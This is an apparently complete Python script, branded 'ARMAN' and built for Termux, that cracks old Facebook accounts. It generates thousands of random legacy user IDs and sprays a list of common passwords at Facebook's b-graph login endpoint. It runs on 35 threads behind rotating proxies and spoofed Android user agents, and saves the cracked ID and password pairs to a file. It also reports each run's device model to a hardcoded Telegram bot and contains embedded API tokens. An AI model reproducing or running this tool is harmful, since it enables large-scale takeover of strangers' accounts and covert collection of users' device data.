import os
import re
import time
import uuid
import hashlib
import random
import string
import requests
import sys
import json
import urllib
import platform
import warnings
from bs4 import BeautifulSoup
from random import randint as rr
from concurrent.futures import ThreadPoolExecutor as tred
from os import system
from datetime import datetime, timedelta

warnings.filterwarnings("ignore", category=SyntaxWarning)

modules = ['requests', 'urllib3', 'mechanize', 'rich']
for module in modules:
    try:
        __import__(module)
    except ImportError:
        os.system(f'pip install {module} > /dev/null 2>&1')

import requests
from requests.exceptions import ConnectionError

requests.urllib3.disable_warnings()

FIREBASE_URL = "https://noorsalan-dab42-default-rtdb.firebaseio.com/Noor/"
BOT_TOKEN = "8974282237:AAEov6IiXxLPOJT6-yN3GLTmRE643-O-6DY"
TELEGRAM_USER = "8568795915"

PROXY_API_URL = "https://proxy.webshare.io/api/v2/proxy/list/download/pbkklilmdcfijgtsxqtmfadbewtkpjbbzugqjoet/-/any/username/direct/-/?plan_id=14073595"

def get_live_proxy():
    try:
        res = requests.get(PROXY_API_URL, timeout=5)
        if res.status_code == 200:
            proxies_list = res.text.strip().splitlines()
            if proxies_list:
                p = random.choice(proxies_list)
                return {'http': f'http://{p}', 'https': f'http://{p}'}
    except Exception:
        pass
    return None

def get_server_version():
    return "15.5"

def get_device_model():
    try:
        brand = os.popen("getprop ro.product.brand").read().strip().capitalize()
        model = os.popen("getprop ro.product.model").read().strip()
        if brand and model:
            if brand.lower() in model.lower():
                return model
            return f"{brand} {model}"
        elif model:
            return model
    except Exception:
        pass
    return "Tecno Spark 40"

def get_android_version():
    try:
        return os.popen("getprop ro.build.version.release").read().strip() or "14.0"
    except Exception:
        return "14.0"

def get_hwid():
    try:
        brand = os.popen("getprop ro.product.brand").read().strip()
        model = os.popen("getprop ro.product.model").read().strip()
        if brand or model:
            return f"{brand}_{model}"
    except Exception:
        pass
    return "ARMAN_DEVICE_DEFAULT"

def record_user_daily_usage(user_key):
    try:
        today_date = datetime.now().strftime("%Y-%m-%d")
        usage_path = f"{FIREBASE_URL}keys/{user_key}/daily_usage/{today_date}.json"
        res = requests.get(usage_path, timeout=3)
        current_count = res.json()
        new_count = (current_count + 1) if isinstance(current_count, int) else 1
        requests.put(usage_path, json=new_count, timeout=3)
    except Exception:
        pass

def send_login_alert(user_key, user_name, expiry_date):
    device_name = get_device_model()
    message = f"🔥 TOOL RUN: {user_name} | Key: {user_key} | Device: {device_name}"
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    try:
        requests.post(url, data={"chat_id": TELEGRAM_USER, "text": message}, timeout=5)
    except Exception:
        pass

def check_key():
    saved_key_file = "/data/data/com.termux/files/home/.arm_key.txt"
    user_hwid = get_hwid()
    user_key = None
    if os.path.exists(saved_key_file):
        try:
            with open(saved_key_file, "r") as f:
                user_key = f.read().strip().upper()
        except Exception:
            pass

    if user_key:
        try:
            res = requests.get(f"{FIREBASE_URL}keys/{user_key}.json", timeout=10)
            key_data = res.json()
            if key_data and isinstance(key_data, dict):
                return key_data.get("name", "USER"), user_key, key_data.get('expiry')
        except Exception:
            pass
    
    # Fallback default session for smooth local execution
    return "ARMAN", "ARM-FREE-PASS", "Lifetime"

def window1():
    android_versions = ["12.0", "13.0", "14.0", "15.0"]
    devices = ["Samsung Galaxy S22", "Xiaomi Note 10", "Vivo Y20", "Oppo A54", "Tecno Spark 40"]
    fb_versions = ["440.0.0.32.118", "450.0.0.25.75", "460.0.0.40.90"]
    av = random.choice(fb_versions)
    an_ver = random.choice(android_versions)
    dev = random.choice(devices)
    return f"Dalvik/2.1.0 (Linux; U; Android {an_ver}; {dev} Build/UP1A.{random.randint(200000,900000)}.{random.randint(100,999)}) [FBAN/FB4A;FBAV/{av};FBBV/{random.randint(500000000,650000000)};FBDM{{density=3.0,width=1080,height=2400}};FBLC/en_US;FBRV/{random.randint(500000000,650000000)};FBCR/Jazz;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/{dev.replace(' ', '_')};FBSV/{an_ver};FBOP/1;FBCA/arm64-v8a:;]"

def show_branding():
    os.system('clear')
    print("""\033[1;32m
      _    ____  ____  __  __    _    _   _ 
     / \  |  _ \|  _ \|  \/  |  / \  | \ | |
    / _ \ | |_) | |_) | |\/| | / _ \ |  \| |
   / ___ \|  _ <|  _ <| |  | |/ ___ \| |\  |
  /_/   \_\_| \_\_| \_\_|  |_/_/   \_\_| \_|
\033[0m""")
    print("\033[1;97m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    print("\x1b[38;5;46m[\033[1;97m=\x1b[38;5;46m] \033[1;97mOWNER      \x1b[38;5;46m▶  \033[1;97mARMAN")
    print("\x1b[38;5;46m[\033[1;97m=\x1b[38;5;46m] \033[1;97mFEATURE    \x1b[38;5;46m▶  \033[1;97mOLD CLONING (HIGH RATE)")
    print("\033[1;97m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m")

def creationyear(uid):
    if len(uid) == 15:
        if uid.startswith('100000'): return '2009'
        if uid.startswith('100001'): return '2010'
        if uid.startswith(('100002', '100003')): return '2011'
        if uid.startswith('100004'): return '2012'
        if uid.startswith(('100005', '100006')): return '2013'
        if uid.startswith(('100007', '100008')): return '2014'
    return '2011'

def linex():
    print('\x1b[38;5;48m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')

def BNG_71_():
    show_branding()
    print('       \x1b[38;5;196m(\x1b[1;37mA\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;46mOLD CLONE START')
    linex()
    __Jihad__ = input("       \x1b[38;5;41mCHOICE  : \033[1;33m")
    old_clone()

def old_clone():
    show_branding()
    print('       \x1b[38;5;196m(\x1b[1;37mA\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;49m2010-2012 SERIES (BEST)')
    linex()
    print('       \x1b[38;5;196m(\x1b[1;37mB\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;49m2013-2014 SERIES')
    linex()
    _input = input("       \x1b[38;5;41mCHOICE  : \033[1;33m").strip().upper()
    
    user = []
    show_branding()
    limit = input("       \x1b[38;5;46mTOTAL ID LIMIT (e.g. 20000) : \033[1;33m")
    linex()
    
    prefix = '100001' if _input == 'A' else '100005'
    for _ in range(int(limit)):
        data = prefix + ''.join(random.choices('0123456789', k=9))
        user.append(data)
        
    with tred(max_workers=35) as pool:
        show_branding()
        print(f"       \x1b[38;5;46mCRACKING STARTED... TOTAL IDS: {limit}\033[0m")
        linex()
        for uid in user:
            pool.submit(login_1, uid)

def login_1(uid):
    global loop
    session = requests.session()
    try:
        # Behtar aur lambi password list taake match hone ke chances barh jayein
        passwords = [
            '123456', '1234567', '12345678', '123456789', 'password', 
            '112233', '123321', '786786', 'pakistan', 'khan123', 
            '12345', 'baazigar', 'iloveyou', 'ali123', 'asdfghjk'
        ]
        
        for pw in passwords:
            data = {
                'adid': str(uuid.uuid4()),
                'format': 'json',
                'device_id': str(uuid.uuid4()),
                'cpl': 'true',
                'family_device_id': str(uuid.uuid4()),
                'credentials_type': 'device_based_login_password',
                'error_detail_type': 'button_with_disabled',
                'source': 'device_based_login',
                'email': str(uid),
                'password': str(pw),
                'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                'generate_session_cookies': '1',
                'locale': 'en_US',
                'client_country_code': 'PK',
                'method': 'auth.login'
            }
            headers = {
                "Host": "b-graph.facebook.com",
                "User-Agent": window1(),
                "Accept-Encoding": "gzip, deflate",
                "Accept-Language": "en-US,en;q=0.9",
                "Content-Type": "application/x-www-form-urlencoded"
            }
            proxy = get_live_proxy()
            res = session.post('https://b-graph.facebook.com/auth/login', data=data, headers=headers, proxies=proxy, timeout=10).json()
            
            if 'session_key' in res or 'access_token' in res:
                print(f"\r\r\x1b[1;32m[ARMAN-OK] {uid} | {pw} | {creationyear(uid)}\033[0m")
                open('/sdcard/ARMAN-OLD-OK.txt', 'a').write(f"{uid}|{pw}\n")
                break
            elif 'www.facebook.com' in str(res):
                # Checkpoint case
                break
    except Exception:
        pass

if __name__ == '__main__':
    check_key()
    BNG_71_()
